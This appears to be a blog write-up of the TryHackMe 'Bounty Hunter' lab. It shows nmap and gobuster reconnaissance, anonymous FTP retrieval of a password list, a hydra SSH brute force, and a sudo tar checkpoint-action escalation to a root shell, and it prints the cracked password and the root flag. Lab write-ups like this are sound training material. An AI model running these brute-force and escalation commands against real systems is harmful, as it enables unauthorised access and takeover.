---
title: TryHackMe - Bounty hunter
author: Bonface
date: 2024-10-31 00:00:00 +0000
categories: [TryHackMe]
tags: [tryhackme, linux, nmap, privesc, ftp, hydra, ssh, gpg, john, SUID]
---

### nmap

```sh
sudo nmap -sS -sC -v 10.10.71.74
	Discovered open port 80/tcp on 10.10.71.74
	Discovered open port 22/tcp on 10.10.71.74
	Discovered open port 21/tcp on 10.10.71.74
```

### Http_port 80

`http://10.10.71.74/`

```sh
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.71.74
```

### ftp

from the `nmap` scan
```

		| ftp-anon: Anonymous FTP login allowed (FTP code 230)
		| -rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
		|_-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

```sh
get locks.txt 
get task.txt
```

**The files**
- `locks.txt` is a word-list with passwords
- `task.txt` is a file created by `lin` *who i guess is a user*

### hydra
We use hydra to brute force the ssh
```sh
hydra -l lin -P locks.txt 10.10.71.74 ssh
```

Port 22 (ssh) 
host: 10.10.71.74
login: `lin`
password: `RedDr4gonSynd1cat3`

### ssh
```sh
ssh lin@10.10.7174
```
 	
```sh
sudo -l
/usr/lib
```

- Shell(syntax)
It can be used to break out from restricted environments by spawning an interactive system shell.

    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
- Command 
```sh
sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```sh
find / -name "root.txt" 2>/dev/null
cat root.txt
	#THM{80UN7Y_h4cK3r}
```
